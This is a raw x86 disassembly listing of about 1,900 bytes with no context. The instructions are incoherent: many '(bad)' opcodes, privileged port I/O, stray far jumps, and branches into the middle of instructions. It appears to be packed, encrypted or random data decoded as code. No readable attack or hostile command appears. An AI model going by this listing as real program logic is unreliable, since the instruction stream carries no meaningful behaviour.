  41005e:	mov    edi,esi
  410060:	cbw    
  410062:	pushf  
  410063:	xchg   ecx,eax
  410064:	mov    ch,0x74
  410066:	and    DWORD PTR [ebx+0x1fb677be],ecx
  41006c:	ins    BYTE PTR es:[edi],dx
  41006d:	dec    eax
  41006e:	and    DWORD PTR [esp],0xffffffe8
  410072:	add    ebp,ebp
  410074:	sbb    esi,DWORD PTR [ebx-0x61]
  410077:	mov    bl,0xa2
  410079:	jno    0x41005e
  41007b:	cdq    
  41007c:	int3   
  41007d:	lods   al,BYTE PTR ds:[esi]
  41007e:	jb     0x41003b
  410080:	sbb    dl,al
  410082:	and    ebp,edi
  410084:	scas   eax,DWORD PTR es:[edi]
  410085:	cld    
  410086:	or     DWORD PTR [ebp+0x2ce5b6e1],ebx
  41008c:	test   al,0x85
  41008e:	lahf   
  41008f:	sahf   
  410090:	fstp   DWORD PTR [edx]
  410092:	push   esp
  410093:	dec    ebp
  410094:	xor    ah,bh
  410096:	xchg   esi,edi
  410098:	push   ds
  410099:	popa   
  41009a:	pop    ebp
  41009b:	xor    DWORD PTR [esi],esp
  41009d:	push   esi
  41009e:	jb     0x4100fe
  4100a0:	xchg   esp,eax
  4100a1:	lock outs dx,BYTE PTR ds:[esi]
  4100a3:	imul   edx,DWORD PTR [edi-0x17],0xffffffc5
  4100a7:	push   ds
  4100a8:	loope  0x41004d
  4100aa:	push   0x6a4d3660
  4100af:	lahf   
  4100b0:	sub    BYTE PTR [eax-0x5a],bl
  4100b3:	push   ecx
  4100b4:	xchg   edi,eax
  4100b5:	mov    dl,0x47
  4100b7:	ret    
  4100b8:	mov    eax,ds:0x29ac2f46
  4100bd:	push   0xcc694916
  4100c2:	int3   
  4100c3:	mov    edi,0x559875a6
  4100c8:	imul   edi,DWORD PTR [edx-0x68],0xffffffbc
  4100cc:	lock sbb al,0x14
  4100cf:	test   BYTE PTR [ebp+0x7ab4384f],cl
  4100d5:	in     eax,0xfb
  4100d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100d8:	mov    eax,0x3569518
  4100dd:	sub    dh,BYTE PTR [ebp+0x17]
  4100e0:	xor    al,0x0
  4100e2:	repz sub eax,0xf19abcf1
  4100e8:	icebp  
  4100e9:	inc    esp
  4100ea:	push   cs
  4100eb:	(bad)  
  4100ec:	in     eax,0x8c
  4100ee:	and    BYTE PTR [ecx-0x11],bh
  4100f1:	cmp    eax,DWORD PTR [esi+0x7d]
  4100f4:	(bad)  
  4100f6:	sbb    al,0x19
  4100f8:	add    DWORD PTR [ebp-0x13966cca],ecx
  4100fe:	inc    esp
  4100ff:	xor    ecx,DWORD PTR [esi-0x69]
  410102:	imul   esi,DWORD PTR [eax-0x1],0xc39cbcff
  410109:	aam    0xf4
  41010b:	enter  0xefcc,0x45
  41010f:	repz xor DWORD PTR [ecx],esp
  410112:	push   0x4df667f3
  410117:	xchg   edx,eax
  410118:	pushf  
  410119:	pop    edx
  41011a:	jne    0x410172
  41011c:	imul   esp,DWORD PTR [edx+0x6f],0xffffff96
  410120:	stos   BYTE PTR es:[edi],al
  410121:	push   cs
  410122:	ja     0x4100f2
  410124:	push   ebx
  410125:	push   ss
  410126:	push   ebx
  410127:	push   cs
  410128:	jne    0x410109
  41012a:	repz enter 0x8ab7,0xda
  41012f:	push   edi
  410130:	push   ecx
  410131:	jg     0x410142
  410133:	dec    esi
  410134:	out    dx,al
  410135:	shr    BYTE PTR ds:0xfdeeb59b,1
  41013b:	pop    ss
  41013c:	out    dx,al
  41013d:	and    bl,BYTE PTR [eax]
  41013f:	mov    ch,0x8e
  410141:	pop    esp
  410142:	xor    DWORD PTR [eax+0x64ab717f],0xf0529cc1
  41014c:	add    ah,BYTE PTR [edx+0x1eedf4cf]
  410152:	in     al,0xe5
  410154:	adc    DWORD PTR [eax-0x7ba82cb3],edx
  41015a:	call   0x26c08f73
  41015f:	aad    0xb3
  410161:	sti    
  410162:	pop    eax
  410163:	ficomp WORD PTR [eax+0x72]
  410166:	pop    edi
  410167:	(bad)  
  41016a:	mov    ds:0x4d399bda,eax
  41016f:	mov    bh,0x15
  410171:	test   ah,bl
  410173:	out    dx,al
  410174:	lods   eax,DWORD PTR ds:[esi]
  410175:	popa   
  410176:	test   al,0x7e
  410178:	(bad)  [edx]
  41017a:	sbb    BYTE PTR [ecx],0xf0
  41017d:	mov    cs,WORD PTR [ebp-0x11b6af02]
  410183:	sub    al,cl
  410185:	adc    al,0x62
  410187:	dec    ebx
  410188:	jae    0x41017c
  41018a:	cmp    ch,dl
  41018c:	or     dh,0xe
  41018f:	mov    edi,0x5926c959
  410194:	xchg   DWORD PTR [ebp+0x42637899],edi
  41019a:	cmp    BYTE PTR [edi+esi*4+0x7b0ca4a9],bh
  4101a1:	rcr    DWORD PTR [ecx+0x1bcda0c0],1
  4101a7:	sbb    DWORD PTR [ecx+ebx*1],0x34
  4101ab:	and    eax,0x381730bd
  4101b0:	sysenter 
  4101b2:	xor    BYTE PTR [eax-0x24f91edc],bh
  4101b8:	push   ecx
  4101b9:	xchg   DWORD PTR [edx],esp
  4101bb:	(bad)  
  4101bc:	jb     0x41019c
  4101be:	ret    
  4101bf:	loop   0x41018a
  4101c1:	scas   eax,DWORD PTR es:[edi]
  4101c2:	inc    ecx
  4101c3:	jmp    0x4101b1
  4101c5:	loope  0x4101a1
  4101c7:	inc    eax
  4101c8:	out    dx,eax
  4101c9:	push   esp
  4101ca:	popa   
  4101cb:	add    ebx,DWORD PTR [edi-0xd2e21a2]
  4101d1:	or     edx,eax
  4101d3:	add    BYTE PTR [edi+0x0],al
  4101d6:	jb     0x4101f0
  4101d8:	mov    eax,DWORD PTR [eax-0x33]
  4101db:	sub    esi,DWORD PTR [ecx]
  4101dd:	mov    BYTE PTR [esi+edx*1],cl
  4101e0:	int    0x96
  4101e2:	or     esi,DWORD PTR [ecx+ebx*1]
  4101e5:	dec    ebp
  4101e6:	dec    ecx
  4101e7:	fst    DWORD PTR [esi+0x3b289aec]
  4101ed:	sub    DWORD PTR [ecx+eax*1+0x16],esi
  4101f1:	or     BYTE PTR [ebx+ebp*8],0xb7
  4101f5:	cmp    edi,edx
  4101f7:	pop    ss
  4101f8:	ror    DWORD PTR [esp+esi*8+0xcb7f546],0xe2
  410200:	cmp    ch,al
  410202:	stos   DWORD PTR es:[edi],eax
  410203:	cmp    BYTE PTR [ecx],ah
  410205:	and    BYTE PTR [edx],dh
  410207:	adc    al,0x26
  410209:	mov    dh,0x52
  41020b:	or     cl,BYTE PTR [edx+0x36]
  41020e:	popf   
  41020f:	ret    
  410210:	jns    0x410208
  410212:	mov    ebx,0x35deaf69
  410217:	or     DWORD PTR [esi],0xfffffff8
  41021a:	pop    ebp
  41021b:	ret    0xf641
  41021e:	aad    0x89
  410220:	dec    edx
  410221:	mov    es,esp
  410223:	xchg   edx,eax
  410224:	sub    edi,ebp
  410226:	adc    esp,DWORD PTR [edx-0x46]
  410229:	add    al,0xb2
  41022b:	and    eax,0xd6a3262f
  410230:	jmp    0xa4f33780
  410235:	(bad)  
  410236:	mov    bh,0xc6
  410238:	mov    ds,WORD PTR [eax-0x5f]
  41023b:	cwde   
  41023c:	loope  0x4102ae
  41023e:	lods   al,BYTE PTR ds:[esi]
  41023f:	pop    edi
  410240:	inc    esp
  410241:	dec    ebx
  410242:	lds    esp,FWORD PTR [esi+0x1a]
  410245:	retf   0x2a39
  410248:	enter  0x323f,0x31
  41024c:	je     0x41026e
  41024e:	xor    BYTE PTR [ebx-0x46],al
  410251:	add    bh,BYTE PTR [edx]
  410253:	sahf   
  410254:	hlt    
  410255:	es mov edx,0xd548c973
  41025b:	ja     0x4102ce
  41025d:	(bad)  
  41025f:	scas   eax,DWORD PTR es:[edi]
  410260:	scas   eax,DWORD PTR es:[edi]
  410261:	cs call 0xb3b51117
  410267:	mov    ch,0xcd
  410269:	adc    eax,0x37567e8e
  41026e:	dec    ecx
  41026f:	pusha  
  410270:	push   eax
  410271:	and    DWORD PTR es:[edx+0x60],ebx
  410275:	int3   
  410276:	loopne 0x410262
  410278:	pop    ecx
  410279:	(bad)
  41027c:	mov    esp,esi
  41027e:	data16 fbld TBYTE PTR [ecx+eiz*1+0x69]
  410283:	dec    ebp
  410284:	dec    esi
  410285:	push   eax
  410286:	xor    esp,DWORD PTR [edi-0x29bda345]
  41028c:	(bad)  ds:0x52cd5205
  410292:	repnz popa 
  410294:	fcom   DWORD PTR [ebp+0x42403f65]
  41029a:	push   esi
  41029b:	mov    ch,0x94
  41029d:	int    0x98
  41029f:	sahf   
  4102a0:	jnp    0x4102b1
  4102a2:	ss pop es
  4102a4:	inc    esi
  4102a5:	aam    0xa4
  4102a7:	cmc    
  4102a8:	inc    ebx
  4102a9:	enter  0xaa42,0x8c
  4102ad:	sbb    al,0x83
  4102af:	or     al,0x9
  4102b1:	inc    edx
  4102b2:	sub    BYTE PTR [eax-0xf],dl
  4102b5:	rol    DWORD PTR [ecx-0x72],1
  4102b8:	(bad)  
  4102b9:	test   al,0xa
  4102bb:	loope  0x41025f
  4102bd:	mov    ds:0xd141e17e,eax
  4102c2:	mov    ds:0x58dca6c2,eax
  4102c7:	outs   dx,BYTE PTR ds:[esi]
  4102c8:	pop    edi
  4102c9:	mov    ?,WORD PTR [ecx+0x11202a99]
  4102cf:	mov    DWORD PTR [ecx+esi*1],edi
  4102d2:	sbb    DWORD PTR [ebx+0x2772365d],eax
  4102d8:	popa   
  4102d9:	mov    cl,0x54
  4102db:	xchg   esp,eax
  4102dc:	xor    edi,DWORD PTR [edx+0x6a]
  4102df:	test   DWORD PTR [ecx+0x3951cfad],0x6a3603d7
  4102e9:	mov    BYTE PTR [ebx],dh
  4102eb:	and    al,0x64
  4102ed:	or     BYTE PTR [edi],bh
  4102ef:	int    0x4f
  4102f1:	adc    ebp,DWORD PTR [eax-0x4a727af2]
  4102f7:	inc    edi
  4102f8:	les    ecx,FWORD PTR [ebx+0x1532f77f]
  4102fe:	scas   al,BYTE PTR es:[edi]
  4102ff:	lods   al,BYTE PTR ds:[esi]
  410300:	fldenv [eax]
  410302:	pop    edi
  410303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410304:	mov    ch,0xb5
  410306:	out    dx,al
  410307:	scas   eax,DWORD PTR es:[edi]
  410308:	bound  edi,QWORD PTR [eax+0x26ba8456]
  41030e:	outs   dx,BYTE PTR ds:[esi]
  41030f:	sbb    edi,DWORD PTR [ecx+0x15bc70eb]
  410315:	test   al,0x71
  410317:	mov    ebp,0xd88fc009
  41031c:	ret    0x7ba2
  41031f:	cmp    DWORD PTR [edx+0xd],ecx
  410322:	test   al,0x7e
  410324:	cli    
  410325:	jns    0x410342
  410327:	cmp    eax,0x4774d464
  41032c:	repnz (bad) 
  41032f:	nop
  410330:	jmp    0x410390
  410332:	out    dx,eax
  410333:	sbb    al,dh
  410335:	mov    edi,0x8b0f0ee8
  41033a:	(bad)  
  41033b:	imul   esp,DWORD PTR [edi+eax*8-0x52e58efe],0xffffffae
  410343:	mov    dl,0x32
  410345:	sub    esi,DWORD PTR [edi*2-0x5e5edd82]
  41034c:	icebp  
  41034d:	push   edi
  41034e:	dec    ebp
  41034f:	les    ebx,FWORD PTR [eax]
  410351:	sub    al,0xa6
  410353:	mov    al,ds:0x397ebc8c
  410358:	cmp    edx,DWORD PTR [edi-0x14]
  41035b:	add    ebp,DWORD PTR [ebp+0x2e]
  41035e:	cmp    al,0x97
  410360:	fdiv   DWORD PTR [edx-0x6f]
  410363:	cmp    al,0x9e
  410365:	and    DWORD PTR [ecx+0x34f0bc97],0x610d504e
  41036f:	push   ecx
  410370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410371:	nop
  410372:	clc    
  410373:	pop    es
  410374:	mov    bh,0x7e
  410376:	add    dh,BYTE PTR [edx+0x37]
  410379:	ja     0x410391
  41037b:	push   0xfffffff8
  41037d:	stc    
  41037e:	pop    es
  41037f:	ret    
  410380:	inc    esp
  410381:	or     al,BYTE PTR [edi-0xb]
  410384:	outs   dx,BYTE PTR ds:[esi]
  410385:	xlat   BYTE PTR ds:[ebx]
  410386:	test   eax,0xc5f55407
  41038b:	out    0x4d,al
  41038d:	mov    ah,0x3c
  41038f:	imul   esi,DWORD PTR [ecx+edi*2+0x45bd98b7],0xffffff9e
  410397:	out    dx,al
  410398:	and    DWORD PTR [ebp-0x79d02ec4],ebx
  41039e:	call   0x84933256
  4103a3:	call   0x6e77b737
  4103a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103aa:	pop    eax
  4103ab:	ins    BYTE PTR es:[edi],dx
  4103ac:	xchg   ecx,eax
  4103ad:	fsub   DWORD PTR [eax-0x18]
  4103b0:	xor    DWORD PTR [edx-0x66],esi
  4103b3:	dec    edi
  4103b4:	jno    0x4103c0
  4103b6:	loope  0x4103be
  4103b8:	xor    BYTE PTR [ecx+0x4a],dh
  4103bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103bc:	mov    ah,0x3e
  4103be:	lds    ecx,FWORD PTR ds:0xffcb1346
  4103c4:	pop    esp
  4103c5:	jp     0x41041c
  4103c7:	ds mov ebp,0x80899dd9
  4103cd:	add    BYTE PTR ds:0x3d5446b3,dh
  4103d3:	in     eax,0x54
  4103d5:	aad    0x81
  4103d7:	push   0xc48acde5
  4103dc:	sub    al,0x54
  4103de:	dec    ebp
  4103df:	push   ss
  4103e0:	outs   dx,DWORD PTR ds:[esi]
  4103e1:	lock mov WORD PTR [ecx-0x2a],?
  4103e5:	fbld   TBYTE PTR [ecx]
  4103e7:	scas   al,BYTE PTR es:[edi]
  4103e8:	in     al,0x7d
  4103ea:	call   0x11e77b3a
  4103ef:	stos   DWORD PTR es:[edi],eax
  4103f0:	add    DWORD PTR ds:0xfbfddebe,eax
  4103f6:	inc    ebp
  4103f7:	fwait
  4103f8:	imul   esp,DWORD PTR [ebp+0x4bf6a8ae],0x13
  4103ff:	(bad)  
  410400:	cmp    dl,al
  410402:	mov    dh,0xdf
  410404:	xchg   ecx,edi
  410406:	xor    eax,0x5611dd6d
  41040b:	std    
  41040c:	inc    eax
  41040d:	xchg   edi,eax
  41040e:	aaa    
  41040f:	xchg   BYTE PTR [esi+0x3e],al
  410412:	sbb    al,0xe3
  410414:	pop    ds
  410415:	inc    esi
  410416:	sbb    al,0x51
  410418:	or     DWORD PTR [ebp-0x7],esp
  41041b:	iret   
  41041c:	push   cs
  41041d:	call   0xc012:0x7bf51755
  410424:	pop    ebp
  410425:	stos   DWORD PTR es:[edi],eax
  410426:	aas    
  410427:	popa   
  410428:	sub    eax,0x30d9a673
  41042d:	mov    ah,cl
  41042f:	repnz xor ch,0xbb
  410433:	mov    eax,0x85185d15
  410438:	or     eax,0xc1c736a1
  41043d:	add    eax,0x3e4f946f
  410442:	sub    DWORD PTR [ebp+0x6a914f74],edi
  410448:	adc    eax,0xb523c2a0
  41044d:	(bad)  
  41044e:	fcmovnu st,st(1)
  410450:	mov    eax,DWORD PTR [ebx]
  410452:	imul   esp,DWORD PTR [eax-0x873dfef],0xffffffb4
  410459:	mov    dl,0xed
  41045b:	addr16 or al,0x37
  41045e:	lds    esi,FWORD PTR [eax+0x3b]
  410461:	jo     0x4103f2
  410463:	adc    ah,cl
  410465:	ja     0x41046f
  410467:	loopne 0x410471
  410469:	aas    
  41046a:	arpl   sp,bp
  41046c:	mov    eax,0x9a19a1d2
  410471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410472:	adc    BYTE PTR [ebx+0x5b],dl
  410475:	retf   0xa419
  410478:	push   cs
  410479:	das    
  41047a:	ss ds push 0x9a6749d3
  410481:	lahf   
  410482:	push   ebp
  410483:	sar    BYTE PTR [ecx],1
  410485:	popf   
  410486:	sub    esi,DWORD PTR ds:0x7e306cb0
  41048c:	pop    esp
  41048d:	mov    edi,0x66358128
  410492:	xor    edx,eax
  410494:	sar    BYTE PTR [edi],cl
  410496:	loop   0x4104a7
  410498:	add    DWORD PTR [ecx],ebx
  41049a:	(bad)  [esi+edx*1]
  41049d:	fisubr DWORD PTR ds:0x2349b71e
  4104a3:	xchg   edi,eax
  4104a4:	dec    esp
  4104a5:	cmp    DWORD PTR [ecx+0x648144f4],ecx
  4104ab:	je     0x4104c4
  4104ad:	inc    eax
  4104ae:	jnp    0x410529
  4104b0:	je     0x410502
  4104b2:	pop    edi
  4104b3:	add    ch,BYTE PTR [esi+0x42809739]
  4104b9:	out    0xb7,al
  4104bb:	inc    esi
  4104bc:	sahf   
  4104bd:	xchg   BYTE PTR fs:[eax-0x2e966eb0],bh
  4104c4:	fisttp DWORD PTR [edi+0x1dc9fd7e]
  4104ca:	add    al,0xad
  4104cc:	pushf  
  4104cd:	and    BYTE PTR [eax+0x19],bh
  4104d0:	clc    
  4104d1:	xor    bh,0x9c
  4104d4:	test   al,0x22
  4104d6:	loopne 0x410484
  4104d8:	shl    DWORD PTR [ecx],cl
  4104da:	pushf  
  4104db:	es ins BYTE PTR es:[edi],dx
  4104dd:	cmp    ebp,DWORD PTR [edi-0x13]
  4104e0:	jmp    0x6b6c89c3
  4104e5:	mov    al,ds:0x89e4ad99
  4104ea:	cwde   
  4104eb:	mov    ebp,0xaaa46ffe
  4104f0:	repz (bad) 
  4104f2:	and    ebp,DWORD PTR [edi+0x20]
  4104f5:	pop    ebx
  4104f6:	mov    esp,DWORD PTR [eax+0xe776512]
  4104fc:	cmp    esp,DWORD PTR [ebx-0x765e8f40]
  410502:	jg     0x410577
  410504:	fidiv  WORD PTR [edi+0x54]
  410507:	add    dh,BYTE PTR [esi-0xb12da70]
  41050d:	and    al,0x51
  41050f:	cmp    DWORD PTR [edi-0x41],0xfffffff4
  410513:	je     0x41056a
  410515:	sti    
  410516:	ret    
  410517:	push   ds
  410518:	mov    ah,0x1f
  41051a:	pop    esp
  41051b:	mov    DWORD PTR [ecx+0x5b],0x53013556
  410522:	dec    eax
  410523:	out    0xbc,eax
  410525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410526:	add    edx,edx
  410528:	mov    ebp,0xa5dc06d
  41052d:	sub    dh,BYTE PTR [eax-0x5]
  410530:	(bad)  
  410531:	xor    DWORD PTR ds:0xeb5b6bd5,esi
  410537:	add    DWORD PTR [edi],eax
  410539:	adc    eax,0x24eae51
  41053e:	sar    BYTE PTR [ebx+edx*2-0x36],cl
  410542:	pop    ebp
  410543:	jmp    0x7768:0xd459d729
  41054a:	cld    
  41054b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41054c:	clc    
  41054d:	frstor [ebx]
  41054f:	adc    ebx,DWORD PTR [edx-0x1b7c51e2]
  410555:	loope  0x410584
  410557:	ror    cl,0xc7
  41055a:	pop    esi
  41055b:	daa    
  41055c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41055d:	inc    edi
  41055e:	mov    esp,0x974b9614
  410563:	mov    dh,0x3
  410565:	cmp    ebp,esp
  410567:	int3   
  410568:	adc    bh,BYTE PTR [edx+ebp*8-0x52b2857]
  41056f:	fdivr  DWORD PTR [esi+0x47e48e38]
  410575:	or     al,0xc7
  410577:	jmp    0x4105d4
  410579:	or     al,0x84
  41057b:	adc    al,BYTE PTR [edx+0x16f35060]
  410581:	inc    esp
  410582:	jmp    0xa2b8:0x1a217e2f
  410589:	enter  0x6ad4,0x2d
  41058d:	in     eax,0xd6
  41058f:	jmp    0x576c:0xb293f0c0
  410596:	add    BYTE PTR [eax],cl
  410598:	sub    dl,ah
  41059a:	pop    ds
  41059b:	xchg   edi,eax
  41059c:	stc    
  41059d:	out    0x3f,al
  41059f:	pop    edx
  4105a0:	pop    ds
  4105a1:	outs   dx,BYTE PTR ds:[esi]
  4105a2:	xchg   edi,eax
  4105a3:	lea    edi,[ecx*1-0x54bb8ef0]
  4105aa:	shr    BYTE PTR [ecx-0x6b],1
  4105ad:	xor    al,0xa9
  4105af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105b0:	xchg   edx,eax
  4105b1:	jg     0x4105ae
  4105b3:	loop   0x4105e7
  4105b5:	and    esi,DWORD PTR [ebp+0x6]
  4105b8:	gs cmp al,0x16
  4105bb:	mov    esp,0xa8ea1da6
  4105c0:	mov    dh,0x38
  4105c2:	ins    BYTE PTR es:[edi],dx
  4105c3:	fld    TBYTE PTR [ecx-0x13ba1128]
  4105c9:	jb     0x4105f7
  4105cb:	(bad)  
  4105cc:	call   0xf86d:0x44241561
  4105d3:	cld    
  4105d4:	jnp    0x4105cd
  4105d6:	add    BYTE PTR [eax],ah
  4105d8:	lods   al,BYTE PTR ds:[esi]
  4105d9:	in     eax,dx
  4105da:	shl    ebp,1
  4105dc:	or     dh,BYTE PTR [edx]
  4105de:	dec    ebp
  4105df:	jno    0x410602
  4105e1:	outs   dx,BYTE PTR ds:[esi]
  4105e2:	push   ds
  4105e3:	sub    ebp,esi
  4105e5:	xchg   ecx,eax
  4105e6:	jl     0x4105ed
  4105e8:	scas   al,BYTE PTR es:[edi]
  4105e9:	push   ebx
  4105ea:	jnp    0x41062f
  4105ec:	ins    DWORD PTR es:[edi],dx
  4105ed:	xlat   BYTE PTR ds:[ebx]
  4105ee:	mov    eax,ds:0x80e0e438
  4105f3:	jno    0x4105c3
  4105f5:	ins    BYTE PTR es:[edi],dx
  4105f6:	arpl   WORD PTR [edx],sp
  4105f8:	in     eax,0xf8
  4105fa:	add    edx,DWORD PTR [ecx+0x2f]
  4105fd:	inc    esi
  4105fe:	sbb    eax,0x9219dbaf
  410603:	data16 icebp 
  410605:	jecxz  0x410618
  410607:	sub    ch,BYTE PTR [ebp+ebx*1-0x44]
  41060b:	mov    dl,0x41
  41060d:	mov    ecx,DWORD PTR [esp+ebx*2-0x6a3cf0fb]
  410614:	sbb    eax,0x42d987f7
  410619:	ret    
  41061a:	push   0xc
  41061c:	out    0x31,al
  41061e:	and    DWORD PTR [ebx],0xb93eea49
  410624:	push   esi
  410625:	xor    bl,bl
  410627:	rol    DWORD PTR [edi-0x19],1
  41062a:	push   ecx
  41062b:	xchg   ecx,eax
  41062c:	xor    al,0x1
  41062e:	jmp    0x4105cc
  410630:	loopne 0x410683
  410632:	sub    dh,BYTE PTR [ebx]
  410634:	add    bl,bh
  410636:	fsub   QWORD PTR [esi-0x17ecb7e2]
  41063c:	les    edi,FWORD PTR [ecx+0x62df0bb3]
  410642:	mov    bl,0x23
  410644:	sbb    esi,DWORD PTR [ecx+0x7edc8883]
  41064a:	add    DWORD PTR [ebx],eax
  41064c:	repz add edi,ebx
  41064f:	add    BYTE PTR fs:[eax+eax*4-0x7f],0x89
  410655:	fwait
  410656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410657:	push   eax
  410658:	push   eax
  410659:	scas   al,BYTE PTR es:[edi]
  41065a:	je     0x410656
  41065c:	jge    0x410614
  41065e:	fstp   DWORD PTR [ecx]
  410660:	lods   eax,DWORD PTR ds:[esi]
  410661:	clc    
  410662:	pop    edx
  410663:	adc    cl,cl
  410665:	push   ebx
  410666:	not    dh
  410668:	int3   
  410669:	add    eax,0x7498d4f8
  41066e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41066f:	in     eax,0x6a
  410671:	push   es
  410672:	add    eax,0x774da663
  410677:	mov    DWORD PTR [edi-0x78c2c108],esp
  41067d:	fdiv   QWORD PTR [ebx+0x4e]
  410680:	pop    ecx
  410681:	push   ss
  410682:	rcr    DWORD PTR [ebx+0x13fee0aa],0x3d
  410689:	popf   
  41068a:	cmp    DWORD PTR [ebp+0x5cb86a1c],esp
  410690:	ins    BYTE PTR es:[edi],dx
  410691:	lds    ebp,FWORD PTR [esi-0x18f12d30]
  410697:	pushf  
  410698:	push   cs
  410699:	mov    ebp,0x904c7b51
  41069e:	inc    edi
  41069f:	jg     0x410683
  4106a1:	test   DWORD PTR ds:0xc139a687,esp
  4106a7:	scas   al,BYTE PTR es:[edi]
  4106a8:	les    esi,FWORD PTR [edx]
  4106aa:	in     eax,dx
  4106ab:	enter  0x5fc3,0x70
  4106af:	sub    bl,BYTE PTR [esp+edi*4-0x6876fde0]
  4106b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106b7:	lock rcr DWORD PTR [esi-0x1f],0xb0
  4106bc:	mov    eax,ds:0x2f3d9247
  4106c1:	popf   
  4106c2:	jge    0x410676
  4106c4:	aas    
  4106c5:	push   es
  4106c6:	cmp    DWORD PTR [ecx+0x6386702d],ebx
  4106cc:	mov    eax,ds:0xcdbf57dd
  4106d1:	test   DWORD PTR [ecx-0x50face92],edx
  4106d7:	and    DWORD PTR [eax+0x391e9648],esp
  4106dd:	outs   dx,DWORD PTR ds:[esi]
  4106de:	bound  edi,QWORD PTR [ebp+0x37ccb59c]
  4106e4:	jo     0x410699
  4106e6:	jbe    0x41071d
  4106e8:	dec    eax
  4106e9:	xor    ebp,DWORD PTR [ecx]
  4106eb:	xchg   esp,eax
  4106ec:	popa   
  4106ed:	clc    
  4106ee:	stc    
  4106ef:	outs   dx,BYTE PTR ds:[esi]
  4106f0:	xchg   esp,eax
  4106f1:	mov    BYTE PTR [edi-0x4077c17b],ah
  4106f7:	dec    ebp
  4106f8:	scas   al,BYTE PTR es:[edi]
  4106f9:	fwait
  4106fa:	inc    ebp
  4106fb:	dec    edi
  4106fc:	dec    edi
  4106fd:	test   al,0x9
  4106ff:	test   bl,0x6d
  410702:	fistp  DWORD PTR [edx]
  410704:	stos   BYTE PTR es:[edi],al
  410705:	repz and BYTE PTR [ecx-0x3f],ch
  410709:	aam    0x26
  41070b:	outs   dx,DWORD PTR ds:[esi]
  41070c:	ins    BYTE PTR es:[edi],dx
  41070d:	xchg   ebp,eax
  41070e:	out    0xbd,eax
  410710:	adc    eax,0x87000b10
  410715:	push   0xf52cad1c
  41071a:	aas    
  41071b:	aam    0xb6
  41071d:	repz cmp eax,0xdb111a72
  410723:	ins    DWORD PTR es:[edi],dx
  410724:	stos   DWORD PTR es:[edi],eax
  410725:	jge    0x410759
  410727:	stos   BYTE PTR es:[edi],al
  410728:	(bad)  
  41072a:	or     cl,BYTE PTR [edx+0x79fd915b]
  410730:	mov    ch,al
  410732:	push   ecx
  410733:	and    al,0xac
  410735:	sub    ebx,DWORD PTR [edi+edx*8+0x29db9767]
  41073c:	(bad)  [ebp-0x3d339dfa]
  410742:	inc    eax
  410743:	in     eax,0xf0
  410745:	push   esp
  410746:	lods   al,BYTE PTR ds:[esi]
  410747:	(bad)  
  410748:	mov    esi,0x47441ee2
  41074d:	sbb    BYTE PTR [ebx-0x3781f07d],dh
  410753:	outs   dx,DWORD PTR ds:[esi]
  410754:	pop    ebx
  410755:	sub    al,BYTE PTR [eax-0x5fd6614e]
  41075b:	pop    ecx
  41075c:	gs ret 
  41075e:	dec    edx
  41075f:	out    0x47,al
  410761:	fisubr WORD PTR [esi]
  410763:	jge    0x410778
  410765:	jo     0x4107a4
  410767:	lods   eax,DWORD PTR gs:[esi]
  410769:	in     eax,dx
  41076a:	nop
  41076b:	jno    0x4107c7
  41076d:	mov    dl,0xb9
  41076f:	add    BYTE PTR [esi+0x46aea128],ch
  410775:	sub    BYTE PTR [edx],ah
  410777:	push   eax
  410778:	xor    DWORD PTR [ebx-0x4a],edx
  41077b:	dec    edi
  41077c:	data16 xchg al,ch
  41077f:	pop    edx
  410780:	pop    ecx
  410781:	cwde   
  410782:	ret    0xee16
  410785:	out    0x9f,al
  410787:	add    BYTE PTR [ebx],al
  410789:	xchg   BYTE PTR [ebx+ebx*8],dl
  41078c:	sar    DWORD PTR [ebx+0x5f6f1000],1
  410792:	test   eax,0x83589359
  410797:	push   cs
  410798:	out    dx,al
  410799:	rcr    DWORD PTR ds:0xc64067d6,cl
  41079f:	xchg   esi,eax
  4107a0:	(bad)  
  4107a1:	(bad)  
  4107a2:	add    eax,0xc80229f3
  4107a7:	pop    esp
  4107a8:	mov    ah,0x55
  4107aa:	mov    bl,BYTE PTR [ecx+0x521e2658]
  4107b0:	inc    edi
  4107b1:	js     0x410791
  4107b3:	mov    eax,0xcabb857d
  4107b8:	popa   
  4107b9:	hlt    
  4107ba:	cld    
  4107bb:	cs pop ebp
  4107bd:	mov    ebx,0x792a3ccf
  4107c2:	mov    dh,0xb5
  4107c4:	dec    esp
  4107c5:	addr16 mov eax,ds:0xc7fd
  4107c9:	fs mov dl,0x4a
  4107cc:	aam    0xbf
  4107ce:	neg    ebx
  4107d0:	out    dx,al
  4107d1:	pop    ebp
  4107d2:	cdq    
  4107d3:	ins    BYTE PTR es:[edi],dx
  4107d4:	xchg   BYTE PTR [ebp-0x7908d9e7],dh
  4107da:	jno    0x4107a7
  4107dc:	mov    ds:0x2f171050,eax
  4107e1:	mov    al,ds:0xaf971303
  4107e6:	sub    DWORD PTR [eax+0x5d4a0886],esi
  4107ec:	fidivr DWORD PTR [edi+0x3d]
  4107ef:	fstp   TBYTE PTR [eax]
  4107f1:	inc    esi
  4107f2:	pop    ebx
  4107f3:	push   edx
  4107f4:	(bad)  
  4107f5:	std    
  4107f6:	mov    ds,edx
  4107f8:	je     0x4107c0
  4107fa:	ins    BYTE PTR es:[edi],dx
  4107fb:	jo     0x410806
  4107fd:	out    0x31,al
  4107ff:	cmp    DWORD PTR [edx-0x78],0x32801dbd
  410806:	data16 cmp BYTE PTR [ebx],cl
  410809:	jecxz  0x4107cc
  41080b:	or     al,0x8
  41080d:	push   es
  41080e:	add    al,0x61
  410810:	scas   al,BYTE PTR es:[edi]
  410811:	mov    dl,0xc9
  410813:	jmp    0x33c1:0xf6f10346
  41081a:	xchg   ebx,eax
  41081b:	daa    
